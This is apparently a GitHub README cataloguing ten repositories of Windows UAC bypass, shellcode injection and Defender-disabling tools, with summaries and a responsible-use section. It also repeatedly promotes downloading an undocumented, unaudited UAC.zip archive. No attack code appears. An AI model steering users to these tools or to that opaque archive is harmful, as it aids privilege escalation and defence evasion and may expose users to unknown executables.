<div align="center">

# Windows UAC Research Catalog

### Ten repositories. Direct sources. Clear research context.

A reference collection for exploring Windows User Account Control research and related administration projects.

[![Download ZIP](https://img.shields.io/badge/Download%20UAC.zip-d90429?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MonoLoader/Windows-UAC-Research-Catalog/releases/download/UAC/UAC.zip?utm_source=github&utm_acc=MonoLoader&utm_name=Windows-UAC-Research-Catalog "Download the UAC release archive")
[![Release Notes](https://img.shields.io/badge/View%20Release-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MonoLoader/Windows-UAC-Research-Catalog/releases/tag/UAC "Open the release page")



---

## Navigation

- [Download and Setup](#download-and-setup)
- [Overview](#overview)
- [Repository Catalog](#repository-catalog)
- [What This Collection Provides](#what-this-collection-provides)
- [Review Checklist](#review-checklist)
- [Frequently Asked Questions](#frequently-asked-questions)
- [Responsible Use](#responsible-use)

## Download and Setup

### Release UAC

| Item | Value |
| --- | --- |
| Publisher account | MonoLoader |
| Release tag | `UAC` |
| Asset | `UAC.zip` |
| Asset size | 1,620,036 bytes |
| Release page | [View on GitHub](https://github.com/MonoLoader/Windows-UAC-Research-Catalog/releases/tag/UAC) |

[![Download ZIP](https://img.shields.io/badge/Download%20UAC.zip-d90429?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MonoLoader/Windows-UAC-Research-Catalog/releases/download/UAC/UAC.zip?utm_source=github&utm_acc=MonoLoader&utm_name=Windows-UAC-Research-Catalog "Download the release archive")

1. Open the release page and confirm that the repository and asset match what you intended to download.
2. Download `UAC.zip` using the button above.
3. Verify the archive checksum against the value below. The value was reported by GitHub for the asset when checked; it was not independently computed from a downloaded copy.
4. Extract the archive into a separate folder and inspect its contents before opening any executable.
5. Follow installation instructions supplied by the publisher only after confirming what the software does and its requirements.

**GitHub-reported SHA-256:**

```text
aae4f3574c901b994ddbe36ef92e9bcc75357117bc0457cca3ccf42af0814cfe
```

Matching this checksum helps confirm file integrity, not that the file is safe. If the release asset is replaced, obtain its current checksum from GitHub before relying on this value.

**Installation status:** The release currently has no description documenting its executable, supported operating systems, dependencies, or launch procedure. No installation command or administrator requirement is asserted here. Do not disable antivirus or other security controls to follow this guide.

### Using the documentation catalog

The README and reference files can be read directly on GitHub. They do not require installing or executing `UAC.zip`. The catalog is not a combined implementation of the ten linked tools.

## Overview

Searching GitHub for **UAC bypass** returns projects with different purposes: technique catalogs, experimental security tools, and broader remote-administration systems.

This collection brings ten previously retrieved results into one navigable reference. Each entry links to its original repository and explains its stated focus without treating author claims as independently verified findings.

The order preserves the collected search results. It is not a ranking of quality, safety, or effectiveness.

## Repository Catalog

### 01 · RENI

**Focus:** Remote desktop and administration.

RENI combines the RENIS server and RENIC mobile client. Its author describes WebAuthn authentication, hardware telemetry, and real-time screen streaming alongside elevated administration features.

**Source:** [metaltroop/RENI](https://github.com/metaltroop/RENI)

**Original Topics:** Not specified.

---

### 02 · UAC Bypass Toolkit v1.1

**Focus:** Windows UAC-related guidance.

The repository describes itself as a “Skip UAC Prompt 1.1 Workaround Guide for Windows 2026.” Review its contents and the destination of any external download links before relying on promotional claims.

**Source:** [slabbayak-223211-bot/uac-bypass-toolkit-v1-1](https://github.com/slabbayak-223211-bot/uac-bypass-toolkit-v1-1)

**Original Topics:** `skip` `skip-download` `skip-install` `skip-key` `skip-patch` `skip-software` `skip-trial` `skip-uac-prompt` `skip-uac-prompt-download` `skip-uac-prompt-install` `skip-uac-prompt-key` `skip-uac-prompt-patch` `skip-uac-prompt-software` `skip-uac-prompt-trial`

---

### 03 · ShellCode Elevator

**Focus:** Shellcode and post-exploitation research.

The author describes a project involving shellcode loaders, injection, and UAC-related behavior. Claims about stealth or antivirus evasion are not validated by inclusion in this catalog.

**Source:** [Krwozer/ShellCode-Elevator-Uac-Bypass-Inject-Any-X64-fud](https://github.com/Krwozer/ShellCode-Elevator-Uac-Bypass-Inject-Any-X64-fud)

**Original Topics:** `antivirus-evasion` `assembly` `bypass` `compiler` `hadler` `post-exploitation` `rat` `redteam` `shellcode` `shellcode-development` `shellcode-encoder` `shellcode-execute` `shellcode-injection` `shellcode-ionjector` `shellcode-loader` `shellcodes` `uac-bypass` `windows`

---

### 04 · CMSTPLua Reflective UAC Bypass

**Focus:** Reflective DLL injection research.

The repository describes a Windows UAC-related tool that loads a DLL from memory. Its documentation includes an overview, requirements, and technical discussion.

**Source:** [Ecerstm/CMSTPLua-Reflective-UAC-Bypass](https://github.com/Ecerstm/CMSTPLua-Reflective-UAC-Bypass)

**Original Topics:** `bypass-technique` `com-elevation` `com-interface` `elevation-moniker` `hacking` `icmluautil` `memory-injection` `pe-loader` `privilege-escalation` `reflective-dll-injection` `uac-bypass` `user-account-control` `windows-api` `windows-development` `windows-exploitation` `windows-security` `windows-uac`

---

### 05 · OUACBypass

**Focus:** UAC technique catalog.

OUACBypass presents itself as a catalog of UAC bypass techniques. It provides a starting point for identifying research topics, rather than proof that any technique applies to every Windows configuration.

**Source:** [owlsecx/OUACBypass](https://github.com/owlsecx/OUACBypass)

**Original Topics:** `owl-os` `pentesting` `red-team` `security` `uac` `windows`

---

### 06 · WinDefCtl

**Focus:** Windows protection-control tooling.

The author describes a command-line utility affecting Windows Defender and Tamper Protection. Because the stated functionality changes security controls, evaluation requires particular care and a recoverable, isolated environment.

**Source:** [wesmar/WinDefCtl](https://github.com/wesmar/WinDefCtl)

**Original Topics:** `disable-tamper-protection-from-command-line` `disable-windows-defender-from-command-line` `sc-stop-windefend` `stop-defender`

---

### 07 · iscsicpl UAC Bypass

**Focus:** iscsicpl-related UAC research.

The repository’s brief description includes claims about Windows 11 26H2 compatibility and Windows Defender detection. These remain author statements, not independently confirmed results.

**Source:** [MemDecompression/iscsicpl-uac-bypass](https://github.com/MemDecompression/iscsicpl-uac-bypass)

**Original Topics:** `bypass-av` `bypass-uac` `dll-hijack` `pentesting-windows` `windows-privilege-escalation`

---

### 08 · Automated Multi UAC Bypass

**Focus:** Multiple UAC-related methods.

The project describes automation across several Windows and Windows Server versions. Its stated platform coverage should not be interpreted as a verified compatibility matrix for current builds.

**Source:** [x0xr00t/Automated-MUlti-UAC-Bypass](https://github.com/x0xr00t/Automated-MUlti-UAC-Bypass)

**Original Topics:** Not specified.

---

### 09 · SspiUacBypass

**Focus:** SSPI Datagram Contexts.

The repository describes research connecting SSPI Datagram Contexts with UAC bypass behavior. Consult the original project for its scope, dependencies, and limitations.

**Source:** [tonykcmarsh/SspiUacBypass](https://github.com/tonykcmarsh/SspiUacBypass)

**Original Topics:** Not specified.

---

### 10 · SharpBypassUAC

**Focus:** C# UAC research tooling.

SharpBypassUAC is described as a C# tool for UAC bypasses. Its README includes parameter documentation and detection-related sections that may inform defensive review.

**Source:** [tonykcmarsh/SharpBypassUAC](https://github.com/tonykcmarsh/SharpBypassUAC)

**Original Topics:** Not specified.

## What This Collection Provides

- **Direct source links:** Open the original repositories instead of unrelated download pages.
- **Readable summaries:** Understand each project’s stated purpose before investigating further.
- **Original topic labels:** Preserve the authors’ terminology, including unusual spellings.
- **Clear limitations:** Distinguish repository descriptions from verified security findings.

## Review Checklist

Before evaluating an unfamiliar security project:

- [ ] Review the author, commit history, and recent changes.
- [ ] Check the license and any usage restrictions.
- [ ] Inspect source code and dependencies before running binaries.
- [ ] Verify where release and download buttons actually lead.
- [ ] Confirm the relevant Windows build and security configuration.
- [ ] Use an isolated environment with a recovery snapshot.
- [ ] Keep production credentials and sensitive data outside the test environment.
- [ ] Record observations separately from the author’s claims.

## Frequently Asked Questions

### Are these repositories verified or endorsed?

No. Inclusion records their presence in the collected search results. It does not establish safety, legitimacy, or effectiveness.

### Are the topic labels release tags?

No. **GitHub Topics** are descriptive labels. They are separate from Git tags and software releases.

### Why do four entries have no Topics?

No Topics were shown on those repository pages when checked. This catalog does not invent labels for those entries.

### What does the download button provide?

It links directly to `UAC.zip` in the `UAC` release published under MonoLoader/Windows-UAC-Research-Catalog. The asset has not been downloaded, audited, or tested for this documentation. It is separate from the ten source projects listed in the catalog.

### Will the search results stay the same?

Not necessarily. GitHub results sorted by recent updates can change. This document preserves the previously collected set of ten repositories.

## Responsible Use

Use these references only for authorized research, defensive analysis, and education. Do not test third-party systems without permission.

Repository descriptions may change over time. Compatibility, licensing, binary safety, and operational claims require separate verification.

## Included Third-Party Documentation

An unchanged copy of the OUACBypass README and its MIT license is included in [third-party/OUACBypass](third-party/OUACBypass/README.md). This is reference documentation, not an included executable tool. Its build instructions refer to upstream source files that are not part of this catalog.

See [THIRD-PARTY-NOTICES.md](THIRD-PARTY-NOTICES.md) for the original author, pinned source commit, and licensing scope.

---

<div align="center">

**Review the source. Verify the claims. Keep testing isolated.**

[![Back to Top](https://img.shields.io/badge/Back%20to%20Top-d90429?style=for-the-badge)](#windows-uac-research-catalog)

</div>
